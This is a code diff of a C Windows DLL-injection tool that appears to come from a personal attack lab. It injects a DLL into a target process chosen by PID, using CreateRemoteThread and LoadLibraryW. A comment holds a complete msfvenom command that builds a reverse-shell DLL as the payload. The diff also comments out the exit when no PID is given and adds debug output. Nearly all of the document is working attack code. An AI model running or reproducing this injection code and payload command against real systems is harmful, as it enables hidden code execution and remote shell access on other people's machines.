@@ -16,12 +16,12 @@ int main(int argc, char *argv[]) {
 
     // Reverse shell to 127.0.0.1:31337
     // msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=31337 -f dll -b \x00\x0a\x0d -o reverse.dll
-    wchar_t dllPath[] = TEXT(".\\reverse.dll");
+    wchar_t dllPath[] = TEXT("E:\\Exclusion Zone\\winjection\\Attacks\\DLLInjection\\reverse.dll");
 
     // Get a PID, error out if improper input for PID
      if(!argv[1] || !(pid=atoi(argv[1]))) {
         printf("No PID was supplied. Exiting.\n");
-        return -1;
+        //return -1;
     }
 
     // For debug: inject into myself
@@ -37,9 +37,12 @@ int main(int argc, char *argv[]) {
     PTHREAD_START_ROUTINE threadStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
     printf("Thread address: %p\n", threadStartRoutineAddress);
     remoteThread = CreateRemoteThread(processHandle, NULL, 0, threadStartRoutineAddress, remoteBuffer, 0, NULL);
-    printf("Remote address: %p\n", remoteThread);
-    WaitForSingleObject(remoteThread, INFINITE);
-    VirtualFreeEx(processHandle, remoteBuffer, sizeof dllPath, MEM_RELEASE);
+    printf("Remote address: %d\n", remoteThread);
+    temp = WaitForSingleObject(remoteThread, INFINITE);
+    printf("Waited        : %d\n", temp);
+    temp = VirtualFreeEx(processHandle, remoteBuffer, NULL, MEM_RELEASE);
+    printf("Freed         : %d\n", temp);
+    printf("Last error    : %d\n", GetLastError());
     CloseHandle(processHandle);
 
     return 0;
